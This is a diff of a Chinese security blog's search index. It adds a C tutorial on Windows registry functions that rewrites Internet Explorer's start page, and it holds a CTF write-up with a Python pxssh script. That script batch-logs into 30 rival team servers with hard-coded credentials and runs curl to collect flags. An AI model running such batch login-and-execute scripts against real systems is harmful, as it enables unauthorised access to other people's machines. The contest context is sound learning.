@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Windows编程之注册表编程基础]]></title>
+    <url>%2F2018%2F09%2F27%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%2F</url>
+    <content type="text"><![CDATA[Windows编程之注册表编程关于注册表，是Windows的一大特色，也是在Windows渗透过程中用得到的，不过我一向觉得Windows的注册表太过神秘（好吧，是因为太多了。。。），那么今天学会了操作注册表的一些操作，包括RegCreateKeyEx, RegOpenKeyEx, RegQueryValueEx, RegSetValueEx, RegDeleteValue, RegCloseKey 代码1234567891011121314151617181920212223#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; HKEY hKey; DWORD dwType; char d[255]; DWORD nLen = sizeof(d); char* data = &quot;https://www.baidu.com/&quot;; RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Internet Explorer\\Main&quot;, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &amp;hKey); RegQueryValueEx(hKey, &quot;Start Page&quot;, 0, &amp;dwType, (LPBYTE)d, &amp;nLen); printf(&quot;before change: %s\n&quot;, d); memset(d, 0, strlen(d)); RegSetValueEx(hKey, &quot;Start Page&quot;, 0, REG_SZ, (BYTE*)data, strlen(data)); RegQueryValueEx(hKey, &quot;Start Page&quot;, 0, &amp;dwType, (LPBYTE)d, &amp;nLen); printf(&quot;after change: %s\n&quot;, d); //RegDeleteValue(hKey, &quot;Start Page&quot;); //RegQueryValueEx(hKey, &quot;Start Page&quot;, 0, &amp;dwType, (LPBYTE)d, &amp;nLen); //printf(&quot;after delete: %s\n&quot;, d); RegCloseKey(hKey); return 0;&#125; 这里稍微说一下这段代码的含义，总的作用就是修改ie浏览器的默认页面，改成baidu的首页。那么首先利用RegOpenKeyEx打开注册表，并且将句柄放到先前声明的hKey中，这里的参数前两个比较好理解，分别是注册表的主键和子建，第三个REG_OPTION_NON_VOLATILE意思是将注册表项存入文件中，使得重启后修改有效，相反的就是REG_OPTION_VOLATILE，意思是重启后无效，KEY_ALL_ACCESS的意思是打开子建后允许任意操作，最后一个是用来存放句柄的。 之后我们使用RegQueryKeyEx函数进行查询，这里第三个选项为保留值，一般为0，第四个是我门声明的一个DWORD变量，这个是用来存放查询的注册表值的类型，第五个是用来存放查询后的值的缓冲区，然后是缓冲区的大小。 查询后我们在利用RegSetValueEx函数进行修改，第三个选项为保留值，一般为0，第四个选项是要修改的注册表的类型，这里是REG_SZ，之后是要修改的数据的缓冲区以及他的大小。 当然了，使用RegDeleteValue即可删除注册表选项，参数也很简单，一个句柄，一个要删除的名字 最后用RegCloseKey来关闭注册表的句柄即可。]]></content>
+      <categories>
+        <category>Windows编程</category>
+      </categories>
+      <tags>
+        <tag>Windows编程</tag>
+        <tag>注册表</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[利用Python实现批量自动化SSH登陆并执行命令后获取数据]]></title>
     <url>%2F2018%2F09%2F25%2F%E5%88%A9%E7%94%A8Python%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96SSH%E7%99%BB%E9%99%86%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%90%8E%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%2F</url>
     <content type="text"><![CDATA[前言放假前辽宁省为了应景“网络安全宣传周”举办了一场安恒杯，初赛依靠大佬们的出色发挥进了决赛，奈何pwn大佬实习出差不能赶回来，我们两个Web只要赶鸭子上架，2 VS 3不过幸运的是最终获取了二等奖，遗憾的是离最终大奖只差一步一摇… 而能够获取这二等奖的原因，也是因为在最后一轮我发现了一个隐藏的用户名和密码，猜到了密码，就可以随意登陆别的队的服务器，然后执行curl命令来获取flag，但是当时不会写登陆ssh的脚本，导致我们两个手动连接30台服务器，累的要死。之后特意来学习一下 代码123456789101112131415161718192021from pexpect import pxssh#host = &apos;&apos;username = &apos;dbappp&apos;password = &apos;dbapp2018&apos;#port = for i in range(0,30): try: host = &quot;10.50.&quot;+str(i)+&quot;.2&quot; s = pxssh.pxssh() s.login(host, username, password) s.sendline(&apos;curl 10.0.1.2&apos;) s.prompt() result = str(s.before, encoding=&apos;utf-8&apos;).split(&apos;\r\n&apos;) print(&apos;Team&apos;+str(i)+&apos;:&apos;) print(result[1]) s.logout() except: print(&quot;pxssh failed on login.&quot;) 首先需要用到python的库pexpect，直接pip3 install pexpect安装即可。 首先pxssh.pxssh()进行初始化，然后直接s.login()登陆即可，这里默认是登陆22端口的，如果需要指定端口，则需要在login函数中指定port参数之后如果用户名密码正确的话，就登陆成功了，再然后使用s.sendline()就可以在服务器上执行命令了，而s.prompt()用来获取前后两个服务器登陆的标志，类似这样其中#井号就是这个标志，这个主要是用来获取两个井号之前的内容，然后利用s.before输出出来，但是我发现这样的话也会将我们输入的命令也获取到，因此我再这里进行了一些处理，就能够获取到flag了。 最后再来一波循环，批量登陆别的队伍的服务器然后获取flag。]]></content>
@@ -481,8 +493,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Linux</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -493,8 +505,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Linux</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -529,8 +541,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Linux</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -593,8 +605,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>Linux</tag>
         <tag>后渗透</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -617,8 +629,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>Mssql</tag>
         <tag>后渗透</tag>
+        <tag>Mssql</tag>
       </tags>
   </entry>
   <entry>
@@ -630,8 +642,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>Mssql</tag>
         <tag>后渗透</tag>
+        <tag>Mssql</tag>
       </tags>
   </entry>
   <entry>
